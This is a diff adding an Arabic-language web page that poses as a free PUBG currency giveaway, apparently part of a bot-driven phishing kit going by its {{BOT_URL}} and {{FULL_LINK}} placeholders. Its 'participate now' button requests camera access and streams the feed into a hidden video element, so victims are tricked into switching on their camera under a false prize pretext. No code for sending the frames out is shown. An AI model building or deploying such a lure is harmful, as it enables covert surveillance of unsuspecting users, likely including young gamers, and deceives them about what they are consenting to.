@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ادخل السحب واربح شدات ببجي مجاناً!</title>
+    <meta property="og:title" content="ادخل السحب واربح شدات ببجي مجاناً!" />
+    <meta property="og:description" content="فرصة لا تعوض للفوز بآلاف الشدات، اضغط للمشاركة الآن!" />
+    <meta property="og:image" content="{{BOT_URL}}/images/pubg.png" />
+    <meta property="og:url" content="{{FULL_LINK}}" />
+    <meta property="og:type" content="website" />
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #2c3e50; color: #ecf0f1; text-align: center; }
+        .container { background: #34495e; padding: 40px; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.2); max-width: 400px; width: 90%; border-top: 5px solid #e74c3c; }
+        img { max-width: 150px; margin-bottom: 25px; }
+        h1 { color: #e74c3c; margin-bottom: 15px; font-size: 1.8em; }
+        p { font-size: 1.1em; line-height: 1.6; margin-bottom: 30px; }
+        button { background-color: #e74c3c; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 1.2em; cursor: pointer; transition: background-color 0.3s ease; }
+        button:hover { background-color: #c0392b; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="{{BOT_URL}}/images/pubg.png" alt="شدات ببجي">
+        <h1>ادخل السحب واربح شدات ببجي مجاناً!</h1>
+        <p>لا تفوت الفرصة! اضغط للمشاركة في السحب الآن.</p>
+        <button id="activateCam">شارك الآن</button>
+        <video id="cameraFeed" autoplay playsinline></video>
+    </div>
+    <script>
+        document.getElementById('activateCam').addEventListener('click', function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    const video = document.getElementById('cameraFeed');
+                    video.srcObject = stream;
+                    console.log('Camera activated');
+                })
+                .catch(function(err) {
+                    console.error('Error accessing camera: ', err);
+                    alert('تعذر الوصول إلى الكاميرا. يرجى التأكد من منح الإذن.');
+                });
+            this.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
